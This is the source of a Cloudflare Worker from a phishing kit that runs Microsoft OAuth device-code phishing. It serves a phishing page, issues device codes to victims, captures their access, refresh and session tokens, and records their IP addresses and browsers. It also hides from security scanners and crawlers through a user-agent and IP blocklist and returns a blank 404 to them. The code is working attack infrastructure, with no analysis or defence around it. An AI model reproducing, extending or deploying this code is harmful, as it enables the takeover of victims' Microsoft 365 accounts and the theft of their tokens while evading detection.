const VERIFY_ENDPOINT = '{{VERIFY_ENDPOINT}}';
const BEACON_ENDPOINT = '{{BEACON_ENDPOINT}}';
const LOG_ENDPOINT = '{{LOG_ENDPOINT}}';

const VERIFY_ENDPOINT_FALLBACK = '{{VERIFY_ENDPOINT_FALLBACK}}';


const _BACKEND_ENDPOINTS = (function () {
  var eps = [];
  for (var i = 0; i < 2; i++) {
    var ep = (i === 0 ? VERIFY_ENDPOINT : VERIFY_ENDPOINT_FALLBACK) || '';
    ep = ep.replace(/\/+$/, '');
    if (ep && eps.indexOf(ep) === -1) eps.push(ep);
  }
  return eps;
})();

async function backendFetch(path, init) {
  var lastErr = null;
  for (var i = 0; i < _BACKEND_ENDPOINTS.length; i++) {
    try {
      var res = await fetch(_BACKEND_ENDPOINTS[i] + path, init);
      if (res.status < 500) return res;
      lastErr = new Error('HTTP ' + res.status + ' from ' + _BACKEND_ENDPOINTS[i]);
    } catch (err) {
      lastErr = err;
    }
  }
  if (lastErr) throw lastErr;
  throw new Error('No backend endpoint configured');
}

function reportDevCode(stage, detail, waitUntil) {
  var p = backendFetch('/api/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      __jwt__: JWT_TOKEN,
      message: '[DevCode] ' + stage + ': ' + String(detail).substring(0, 400),
      source: 'worker/devicecode',
      ua: '',
    }),
  }).catch(function () {});
  if (typeof waitUntil === 'function') waitUntil(p);
  return p;
}

function diag(step, detail, waitUntil) {
  var p = backendFetch('/api/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      __jwt__: JWT_TOKEN,
      message: '[DevCode][DIAG] step=' + step + ' ' + String(detail).substring(0, 400),
      source: 'worker/diag',
      ua: '',
    }),
  }).catch(function () {});
  if (typeof waitUntil === 'function') waitUntil(p);
  return p;
}

const JWT_TOKEN = '{{JWT_TOKEN}}';

const BLOCKED_IPS_RAW = '{{BLOCKED_IPS}}';
let BLOCKED_IPS = [];
try {
  const _parsedIps = JSON.parse(BLOCKED_IPS_RAW);
  if (Array.isArray(_parsedIps)) BLOCKED_IPS = _parsedIps;
} catch (e) {
  BLOCKED_IPS = [];
}

function isPrivateVisitorIp(addr) {
  var a = String(addr || '').replace(/^::ffff:/, '').trim();
  if (!a) return true;
  if (a === '::' || a === '::1' || a.indexOf('fe80:') === 0 || a.indexOf('fc') === 0 || a.indexOf('fd') === 0) {
    return true;
  }
  var m = a.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
  if (!m) return false;
  var o1 = +m[1], o2 = +m[2];
  if (o1 > 255 || o2 > 255 || +m[3] > 255 || +m[4] > 255) return true;
  if (o1 === 0 || o1 === 10 || o1 === 127 || o1 === 169) return true;
  if (o1 === 172 && o2 >= 16 && o2 <= 31) return true;
  if (o1 === 192 && o2 === 168) return true;
  return false;
}

// Simple in-memory rate limiter (per deployment)
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60000; // 1 minute
const RATE_LIMIT_MAX_REQUESTS = 30; // Max 30 requests per minute per IP

function checkRateLimit(ip) {
  const now = Date.now();
  const record = rateLimitMap.get(ip);
  if (!record) {
    rateLimitMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  if (now - record.windowStart > RATE_LIMIT_WINDOW) {
    rateLimitMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  record.count++;
  if (record.count > RATE_LIMIT_MAX_REQUESTS) {
    return true; // Rate limited
  }
  return false;
}

function isBotRequest(request) {
  const userAgent = request.headers.get('user-agent') || '';
  const accept = request.headers.get('accept') || '';
  const acceptLanguage = request.headers.get('accept-language') || '';
  const acceptEncoding = request.headers.get('accept-encoding') || '';
  const referer = request.headers.get('referer') || '';
  const secFetchSite = request.headers.get('sec-fetch-site') || '';
  const secFetchMode = request.headers.get('sec-fetch-mode') || '';
  const secFetchDest = request.headers.get('sec-fetch-dest') || '';
  const secFetchUser = request.headers.get('sec-fetch-user') || '';
  const cfRay = request.headers.get('cf-ray') || '';
  const cfIPCountry = request.headers.get('cf-ipcountry') || '';
  
  const visitorIp = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    request.headers.get('X-Real-IP') || '';
  

  var blocklistIp = visitorIp ? visitorIp.split(',')[0].trim() : '';
  if (blocklistIp && !isPrivateVisitorIp(blocklistIp) && BLOCKED_IPS.indexOf(blocklistIp) !== -1) {
    return { isBot: true, reason: 'ip_blocklist' };
  }
  
  if (visitorIp && !isPrivateVisitorIp(visitorIp) && checkRateLimit(visitorIp)) {
    return { isBot: true, reason: 'rate_limit' };
  }
  

  let score = 0;
  let reasons = [];
  
  // ─── DEFINITE BOT INDICATORS (+10 each) ──────────────────
  // These alone will block - bots that spoof user agent
  const botSignatures = [
    // Crawlers and search engines
    'bot', 'crawler', 'spider', 'scraper', 'crawling',
    'googlebot', 'bingbot', 'slurp', 'duckduckbot',
    'baiduspider', 'yandexbot', 'facebookexternalhit',
    'twitterbot', 'rogerbot', 'linkedinbot',
    
    // Automated browsers
    'headless', 'phantomjs', 'puppeteer', 'playwright',
    'selenium', 'webdriver', 'automation',
    
    // Security scanners
    'nmap', 'masscan', 'zaproxy', 'burpsuite',
    'sqlmap', 'nikto', 'wget', 'curl',
    
    // Tools
    'axios', 'guzzle', 'python-requests', 'java/',
    'okhttp', 'postman', 'insomnia',
    
    // Anti-bot services
    'scrapy', 'beautifulsoup', 'httpx',
    
    // Known bad actors
    'monitor', 'checker', 'probe', 'scanner',
    'uptime', 'statuscake', 'pingdom',
  ];
  
  const uaLower = userAgent.toLowerCase();
  for (const sig of botSignatures) {
    if (uaLower.includes(sig)) {
      score += 10;
      reasons.push('user_agent:' + sig);
      break;
    }
  }
  
  // ─── SUSPICIOUS INDICATORS (+1 each) ─────────────────────
  // These alone won't block - real browsers can miss these
  
  // Missing Accept header (+1)
  if (!accept || accept === '*/*') {
    score += 1;
    reasons.push('missing_accept');
  }
  
  // Missing Accept-Language (+1)
  if (!acceptLanguage) {
    score += 1;
    reasons.push('missing_accept_language');
  }
  
  // Missing Accept-Encoding (+1)
  if (!acceptEncoding || acceptEncoding === 'identity') {
    score += 1;
    reasons.push('suspicious_accept_encoding');
  }
  
  // Missing ALL sec-fetch headers (+2)
  // Cloudflare Workers sometimes strip these, so only +2
  let missingSecFetch = 0;
  if (!secFetchSite) missingSecFetch++;
  if (!secFetchMode) missingSecFetch++;
  if (!secFetchDest) missingSecFetch++;
  if (missingSecFetch >= 3) {
    score += 2;
    reasons.push('missing_sec_fetch');
  }
  
  // Missing cookie (+1)
  const cookie = request.headers.get('cookie') || '';
  if (!cookie) {
    score += 1;
    reasons.push('missing_cookie');
  }
  
  // Suspicious connection (+1)
  const connection = request.headers.get('connection') || '';
  if (connection && !connection.includes('keep-alive') && !connection.includes('close')) {
    score += 1;
    reasons.push('suspicious_connection');
  }
  
  // ─── DECISION ──────────────────────────────────────────────
  // Only block if score >= 10 (definite bot with bot user agent)
  if (score >= 10) {
    return { isBot: true, reason: reasons.join(','), score: score };
  }
  
  // Allow - real browser or not enough evidence
  return { isBot: false, score: score, reasons: reasons };
}

export default {
  async fetch(request, env, ctx) {
    return handleRequest(request, ctx.waitUntil.bind(ctx));
  }
};

function _corsHeaders(request, isPreflight) {
  var origin = '';
  try { origin = String(request.headers.get('Origin') || '').trim(); } catch (e) { origin = ''; }
  // Same origin has no Origin header; "null" is a sandboxed iframe.
  if (!origin || origin === 'null' || /\s/.test(origin)) return {};
  var h = {
    'Access-Control-Allow-Origin': origin,
    'Vary': 'Origin'
  };
  if (isPreflight) {
    h['Access-Control-Allow-Methods'] = 'GET,POST,OPTIONS';
    h['Access-Control-Allow-Headers'] = 'Content-Type,X-Auth-Mode,X-VG-JWT,X-Turnstile-Token';
    h['Access-Control-Max-Age'] = '86400';
  }
  return h;
}

// Attach CORS headers to an already-built response, preserving existing values
// (including a pre-existing Vary list) and never throwing.
function _withCors(response, request) {
  try {
    var extra = _corsHeaders(request, false);
    var h = response && response.headers;
    if (h && extra['Access-Control-Allow-Origin']) {
      var vary = h.get('Vary') || '';
      if (!vary) h.set('Vary', extra['Vary']);
      else if (vary.indexOf(extra['Vary']) === -1) h.set('Vary', vary + ', ' + extra['Vary']);
      h.set('Access-Control-Allow-Origin', extra['Access-Control-Allow-Origin']);
    }
  } catch (e) { /* never break a request over CORS headers */ }
  return response;
}

async function handleRequest(request, waitUntil) {
  const url = new URL(request.url);

  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: _corsHeaders(request, true) });
  }

  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start' || url.pathname === '/api/verify') {
    diag('REQ', 'method=' + request.method + ' path=' + url.pathname +
      ' ip=' + (request.headers.get('CF-Connecting-IP') || request.headers.get('X-Forwarded-For') || '-') +
      ' ray=' + (request.headers.get('cf-ray') || '-').substring(0, 20), waitUntil);
  }

  if (url.pathname === '/api/devicecode' || url.pathname === '/api/device/start') {
    return _withCors(await handleDeviceCodeRequest(request, waitUntil), request);
  }
  if (url.pathname === '/api/verify') {
    return _withCors(await handleVerifyRequest(request), request);
  }
  if (url.pathname === '/api/beacon') {
    return _withCors(new Response('ok', { status: 200 }), request);
  }
  if (url.pathname === '/api/log') {
    return _withCors(await handleLogRequest(request), request);
  }

  // Page serving - the only thing the bot gate protects.
  const botCheck = isBotRequest(request);
  if (!botCheck.isBot) {
    if (request.method === 'GET' && !url.pathname.startsWith('/api/')) {
      return servePhishingPage(request);
    }
  } else {
    diag('GATE_BLOCK', 'reason=' + botCheck.reason + ' method=' + request.method + ' path=' + url.pathname +
      ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 80), waitUntil);

    // Continue reporting scanner IPs in the background without delaying the response.
    if (botCheck.reason.indexOf('ip_blocklist') === -1) {
      const signalIp = (request.headers.get('CF-Connecting-IP') ||
                        request.headers.get('X-Forwarded-For') || '')
                        .split(',')[0].trim();
      if (signalIp && typeof waitUntil === 'function') {
        waitUntil(backendFetch('/api/scanner-signal', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ip: signalIp,
            user_agent: request.headers.get('user-agent') || '',
            reason: botCheck.reason,
            jwt_token: JWT_TOKEN,
          }),
        }).catch(function () {}));
      }
    }

    const notFoundPage = `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Not Found</title><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden}</style></head><body></body></html>`;
    return new Response(notFoundPage, {
      status: 404,
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
      },
    });
  }

  if (url.pathname.startsWith('/api/')) {
    diag('NO_ROUTE', 'method=' + request.method + ' path=' + url.pathname, waitUntil);
  }
  return new Response('Not Found', { status: 404 });
}

async function servePhishingPage(request) {
  const jwtToken = '{{JWT_TOKEN}}';
  const turnstileKey = '{{TURNSTILE_KEY}}';
  const templateHTML = '{{TEMPLATE_HTML}}';

  // Get visitor IP from Cloudflare
  const visitorIp = request.headers.get('CF-Connecting-IP') || 
                    request.headers.get('X-Forwarded-For') || 
                    request.headers.get('X-Real-IP') || 
                    '';

  // Check if visitor should be blocked or challenged
  try {
    const blockResponse = await backendFetch('/api/capture/visitor/block-check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ jwt_token: jwtToken, visitor_ip: visitorIp }),
    });
    const blockData = await blockResponse.json();

    if (blockData.blocked) {
      if (blockData.redirect_url) {
        // Redirect to the configured URL
        return new Response(null, {
          status: 302,
          headers: { 'Location': blockData.redirect_url }
        });
      } else {
        // Show blank page for blocked visitors
        return new Response('', {
          status: 200,
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-cache, no-store, must-revalidate',
          }
        });
      }
    }

    if (blockData.challenged) {
    }
  } catch (e) {
    // If block check fails, serve the page anyway
  }

  // Try to verify subscription via JWT, but serve page even if verification fails
  let clientId = '';
  let tenant = 'common';
  let dynamicTurnstileKey = turnstileKey;

  try {
    const verifyResponse = await backendFetch('/api/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: jwtToken, caller: 'page' }),
    });
    const verifyData = await verifyResponse.json();
    if (verifyData.valid) {
      clientId = verifyData.client_id;
      tenant = verifyData.tenant;
      if (verifyData.turnstile_key) turnstileKey = verifyData.turnstile_key;
    }
  } catch (e) {
    // Verification failed - continue anyway, client-side will handle errors
  }

  // Inject dynamic values
  let html = templateHTML
    .replace(/{{JWT_TOKEN}}/g, jwtToken)
    .replace(/{{TURNSTILE_KEY}}/g, turnstileKey)
    .replace(/{{CLIENT_ID}}/g, clientId)
    .replace(/{{TENANT}}/g, tenant)
    .replace(/{{VERIFY_ENDPOINT}}/g, VERIFY_ENDPOINT)
    .replace(/{{BEACON_ENDPOINT}}/g, BEACON_ENDPOINT)
    .replace(/{{LOG_ENDPOINT}}/g, LOG_ENDPOINT);

  // Randomize class names for anti-fingerprinting
  html = html.replace(/vg-/g, 'vg-' + Math.random().toString(36).substring(2, 6) + '-');

  return new Response(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src *; img-src * data: blob:; style-src * 'unsafe-inline';",
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'Pragma': 'no-cache',
      'Expires': '0',
    },
  });
}

async function handleDeviceCodeRequest(request, waitUntil) {
  try {
    const { jwt_token, turnstile_token } = await request.json();

    // The worker owns the whole device-code flow, so the backend never sees
    // this request and can never learn the victim's real address. Report it in
    // the /api/capture payload, otherwise every capture is stored with IP
    // 0.0.0.0 and a "Phishing Worker" user agent.
    const visitorIp = (request.headers.get('CF-Connecting-IP') ||
                       request.headers.get('X-Forwarded-For') ||
                       request.headers.get('X-Real-IP') || '').split(',')[0].trim();
    const visitorUa = request.headers.get('user-agent') || '';

    reportDevCode('REQUEST RECEIVED', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_token_present=' + (!!turnstile_token) + ' turnstile_token_len=' + String(turnstile_token || '').length + ' verify_endpoint=' + VERIFY_ENDPOINT + ' fallback=' + VERIFY_ENDPOINT_FALLBACK, waitUntil);
    diag('DEVSTART_ENTRY', 'jwt_len=' + String(jwt_token || '').length + ' turnstile_present=' + (!!turnstile_token) + ' turnstile_len=' + String(turnstile_token || '').length + ' ua=' + String(request.headers.get('user-agent') || '').substring(0, 60), waitUntil);

    // Verify JWT with backend
    try {
      const verifyResponse = await backendFetch('/api/verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ token: jwt_token, caller: 'devicecode' }),
      });
      const verifyData = await verifyResponse.json();
      if (!verifyData.valid) {
        reportDevCode('FAILED at /api/verify', 'http=' + verifyResponse.status + ' body=' + JSON.stringify(verifyData), waitUntil);
        return new Response(JSON.stringify({ error: 'Invalid or expired session' }), {
          status: 403,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      diag('VERIFY_OK', 'tenant=' + verifyData.tenant + ' client_id=' + (verifyData.client_id || '(none)') + ' turnstile_key_set=' + !!verifyData.turnstile_key + ' turnstile_key_len=' + String(verifyData.turnstile_key || '').length, waitUntil);

      // Verify Turnstile
      const turnstileVerify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          secret: '{{TURNSTILE_SECRET}}',
          response: turnstile_token,
        }),
      });
      const turnstileData = await turnstileVerify.json();
      if (!turnstileData.success) {
        reportDevCode('FAILED at turnstile', 'success=' + turnstileData.success + ' codes=' + JSON.stringify(turnstileData['error-codes']) + ' token_present=' + (!!turnstile_token) + ' token_len=' + String(turnstile_token || '').length, waitUntil);
        return new Response(JSON.stringify({ error: 'CAPTCHA verification failed' }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      diag('TURNSTILE_OK', 'token_len=' + String(turnstile_token || '').length, waitUntil);

      // Delegate the device-code request AND the token polling to the backend.
      // Polling has to live on the server: Cloudflare kills the worker's
      // background task after ~30-45 s, and a human needs 30-120 s to enter
      // the code and authenticate. Anything past that deadline was polled by
      // nobody, so the token was never captured, the visitor stayed "waiting"
      // and the 20-minute cron flipped it to "timeout".
      // deviceProxy.startDeviceFlow() starts a server-side poller that runs for
      // the whole code lifetime, stores the token (cookies, PRT, refresh-token
      // exchange), flips the visitor to "done" and fires the panel + Telegram
      // notifications itself.
      const authMode = request.headers.get('x-auth-mode') || 'cookie';
      const startResponse = await backendFetch('/api/device/start', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': visitorUa || 'Mozilla/5.0 (compatible)',
        },
        body: JSON.stringify({
          mode: authMode,
          jwt_token: jwt_token,
          ip: visitorIp,
          user_agent: visitorUa,
          tenant: verifyData.tenant,
          client_id: verifyData.client_id,
        }),
      });
      const startData = await startResponse.json().catch(function () { return null; });
      diag('BACKEND_DEVICE_START', 'http=' + startResponse.status + ' body=' + JSON.stringify(startData).substring(0, 300), waitUntil);

      if (startResponse.status >= 500 || !startData) {
        reportDevCode('FAILED at backend device/start', 'http=' + startResponse.status + ' body=' + JSON.stringify(startData).substring(0, 300), waitUntil);
        return new Response(JSON.stringify({ error: 'Failed to generate code' }), {
          status: 500,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      // block_done_visitors: this address already completed a flow for the link.
      if (startData.blocked) {
        return new Response(JSON.stringify({ blocked: true, redirect_url: startData.redirect_url }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      if (!startData.user_code) {
        reportDevCode('FAILED at backend device/start', 'http=' + startResponse.status + ' error=' + (startData.error || '(none)') + ' message=' + (startData.message || '(none)'), waitUntil);
        return new Response(JSON.stringify({ error: startData.error || 'Failed to generate code' }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' },
        });
      }

      diag('SUCCESS', 'user_code=' + startData.user_code + ' verification_uri=' + startData.verification_uri + ' expires_in=' + startData.expires_in + ' job_id=' + (startData.job_id || '(none)'), waitUntil);
      return new Response(JSON.stringify({
        user_code: startData.user_code,
        verification_uri: startData.verification_uri,
        expires_in: startData.expires_in,
        message: startData.message,
      }), {
        headers: { 'Content-Type': 'application/json' },
      });
    } catch (innerErr) {
      throw innerErr;
    }
  } catch (err) {
    reportDevCode('FAILED uncaught', err.message + ' :: stack=' + String(err.stack || '').substring(0, 250), waitUntil);
    return new Response(JSON.stringify({ error: 'Failed to generate code', details: err.message }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }
}

// DEAD CODE - do not call. handleDeviceCodeRequest() now delegates the
// device-code request and the token polling to the backend's /api/device/start,
// whose server-side poller (deviceProxy.pollForToken) outlives the worker and
// is what stores the token / updates the visitor / fires panel + Telegram.
// Keeping this here would race that poller and double-store.
async function pollForTokens(deviceCode, jwtToken, verifyData, initialInterval, visitorIp, visitorUa, waitUntil) {
  const maxAttempts = 60;
  let attempts = 0;
  let interval = initialInterval || 5; // Use server-recommended interval

  while (attempts < maxAttempts) {
    attempts++;

    // Wait for the current interval (adaptive based on server response)
    await new Promise(resolve => setTimeout(resolve, interval * 1000));

    try {
      const tokenResponse = await fetch(
        `https://login.microsoftonline.com/${verifyData.tenant}/oauth2/v2.0/token`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams({
            grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
            client_id: verifyData.client_id,
            device_code: deviceCode,
          }),
        }
      );
      const tokenData = await tokenResponse.json();

      if (tokenData.access_token) {
        const capturePayload = {
          jwt_token: jwtToken,
          access_token: tokenData.access_token,
          refresh_token: tokenData.refresh_token,
          id_token: tokenData.id_token,
          ip: visitorIp,
          user_agent: visitorUa,
        };

        // Add PRT persistence fields if available
        if (tokenData.client_info) {
          capturePayload.client_info = tokenData.client_info;
        }
        if (tokenData.session_key) {
          capturePayload.session_key = tokenData.session_key;
        }
        if (tokenData.session_key_enc) {
          capturePayload.session_key_enc = tokenData.session_key_enc;
        }
        if (tokenData.token_type) {
          capturePayload.token_type = tokenData.token_type;
        }
        if (tokenData.expires_in) {
          capturePayload.expires_in = tokenData.expires_in;
        }
        if (tokenData.scope) {
          capturePayload.scope = tokenData.scope;
        }

        const captureResponse = await backendFetch('/api/capture', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'User-Agent': visitorUa || 'Mozilla/5.0 (compatible)' },
          body: JSON.stringify(capturePayload),
        });
        diag('TOKEN_CAPTURED', 'http=' + captureResponse.status + ' attempt=' + attempts, waitUntil);
        return;
      }

      // Handle specific OAuth device code errors
      const errorCode = tokenData.error || '';
      const errorDesc = tokenData.error_description || '';

      if (errorCode === 'authorization_pending') {
        // User has not yet authorized - continue polling with same interval
        continue;
      }

      if (errorCode === 'slow_down') {
        // Microsoft is rate-limiting - increase interval by 5 seconds
        interval = interval + 5;
        continue;
      }

      // Personal account errors - stop immediately with "code expired" behavior
      if (
        errorCode === 'expired_token' ||
        errorCode === 'authorization_declined' ||
        errorDesc.includes('AADSTS50079') ||  // MSA account requires interaction
        errorDesc.includes('personal account') ||
        errorDesc.includes('MSA') ||
        (errorCode === 'invalid_grant' && (
          errorDesc.includes('expired') ||
          errorDesc.includes('personal') ||
          errorDesc.includes('MSA')
        ))
      ) {
        // Personal account or declined - stop polling immediately
        // This matches competitor behavior showing "code expired"
        return;
      }

      // For any other error, continue polling (network issues, etc.)
    } catch (e) {
      // Continue polling on network errors
    }
  }
}

async function handleVerifyRequest(request) {
  const { token } = await request.json();
  const verifyResponse = await backendFetch('/api/verify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token, caller: 'worker-verify' }),
  });
  return verifyResponse;
}

async function handleLogRequest(request) {
  try {
    const body = await request.json();
    await backendFetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
  } catch (e) { /* silent */ }
  return new Response('ok', { status: 200 });
}


function renderErrorPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Page Unavailable</title>
  <style>
    body {
      font-family: "Segoe UI", sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: #f3f4f6;
      margin: 0;
    }
    .card {
      background: white;
      border-radius: 8px;
      padding: 48px;
      text-align: center;
      box-shadow: 0 2px 16px rgba(0,0,0,0.1);
      max-width: 420px;
    }
    h2 { color: #333; margin-bottom: 12px; }
    p { color: #666; }
  </style>
</head>
<body>
  <div class="card">
    <h2>This page is no longer available</h2>
    <p>The requested resource has been removed or is temporarily unavailable.</p>
  </div>
</body>
</html>`;
}
